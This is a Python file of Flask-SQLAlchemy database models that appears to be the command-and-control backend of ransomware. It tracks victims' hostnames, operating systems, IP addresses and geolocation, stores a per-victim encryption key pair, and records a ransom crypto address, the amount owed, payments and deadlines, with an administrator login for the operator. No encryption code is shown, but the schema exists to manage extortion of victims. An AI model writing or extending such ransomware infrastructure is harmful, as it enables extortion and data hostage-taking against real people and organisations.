from app import db
from datetime import datetime
from werkzeug.security import generate_password_hash, check_password_hash
from flask_login import UserMixin


class Users(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80))
    hostname = db.Column(db.String(120))
    uid = db.Column(db.String(120), unique=True)
    os_name = db.Column(db.String(120))
    os_version = db.Column(db.String(120))
    os_architecture = db.Column(db.String(120))
    email = db.Column(db.String(120))
    ip_address = db.Column(db.String(80))
    # keys
    public_key = db.Column(db.String(4000))
    private_key = db.Column(db.String(10000))
    # payment details
    crypto_address = db.Column(db.String(120), unique=True, nullable=False)
    total_payment = db.Column(db.Float, nullable=False, default=0.0)
    status = db.Column(db.Boolean, default=False, nullable=False)
    amount_paid = db.Column(db.Float, default=0.0, nullable=False)
    address_index = db.Column(db.Integer, unique=True)
    # creation date
    creation_date = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    expiration = db.Column(db.DateTime, nullable=False)

    def __init__(self, username, hostname, uid, os_name, os_version, os_architecture, email, ip_address, public_key, private_key,
                 crypto_address, total_payment, status, amount_paid, address_index, creation_date, expiration):
        self.username = username
        self.hostname = hostname
        self.uid = uid
        self.os_name = os_name
        self.os_version = os_version
        self.os_architecture = os_architecture
        self.email = email
        self.ip_address = ip_address
        self.public_key = public_key
        self.private_key = private_key
        self.crypto_address = crypto_address
        self.total_payment = total_payment
        self.status = status
        self.amount_paid = amount_paid
        self.address_index = address_index
        self.creation_date = creation_date
        self.expiration = expiration

    def __repr__(self):
        return f'<UID {self.uid}>'


class UsersPaid(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80))
    hostname = db.Column(db.String(120))
    uid = db.Column(db.String(120), unique=True)
    os_name = db.Column(db.String(120))
    os_version = db.Column(db.String(120))
    os_architecture = db.Column(db.String(120))
    email = db.Column(db.String(120))
    ip_address = db.Column(db.String(80))
    public_key = db.Column(db.String(4000))
    private_key = db.Column(db.String(10000))
    crypto_address = db.Column(db.String(120), unique=True, nullable=False)
    total_payment = db.Column(db.Float, nullable=False, default=0.0)
    status = db.Column(db.Boolean, default=False, nullable=False)
    amount_paid = db.Column(db.Float, default=0.0, nullable=False)
    address_index = db.Column(db.Integer, unique=True)
    creation_date = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    payment_date = db.Column(db.DateTime, nullable=False)


class UsersData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    uid = db.Column(db.String(120), unique=True)
    files = db.Column(db.Integer)
    ip = db.Column(db.String(120))
    city = db.Column(db.String(120))
    region = db.Column(db.String(120))
    country = db.Column(db.String(120))
    postal = db.Column(db.String(120))
    latitude = db.Column(db.String(120))
    longitude = db.Column(db.String(120))


class Administrator(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(128), nullable=False)

    def set_password(self, password):
        self.password = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password, password)

    def is_active(self):
        return True


